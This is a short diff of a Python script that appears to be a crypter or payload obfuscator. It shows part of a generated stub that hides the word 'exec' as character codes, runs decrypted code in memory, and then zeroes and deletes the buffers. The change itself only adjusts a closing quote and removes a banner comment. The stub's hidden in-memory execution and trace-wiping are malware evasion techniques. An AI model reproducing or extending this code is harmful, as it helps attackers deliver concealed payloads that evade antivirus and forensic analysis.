@@ -77,12 +77,11 @@ getattr(__import__("builtins"), "".join(map(chr, [101, 120, 101, 99])))(mem_code
 ctypes.memset(ctypes.addressof(ctypes.c_char.from_buffer(decrypted_data)), 0, len(decrypted_data))
 ctypes.memset(ctypes.addressof(ctypes.c_char.from_buffer(mem_code)), 0, len(mem_code))
 del decrypted_data, mem_code
-    """
+"""
     return stub_code
 
 
 if __name__ == "__main__":
-    # Baner
     os.system("cls" if os.name == "nt" else "clear")
     print(Fore.LIGHTRED_EX + "\n  ██████╗ ██████╗ ███████╗███████╗███████╗")
     print(Fore.LIGHTRED_EX + " ██╔═████╗██╔══██╗██╔════╝██╔════╝██╔════╝")
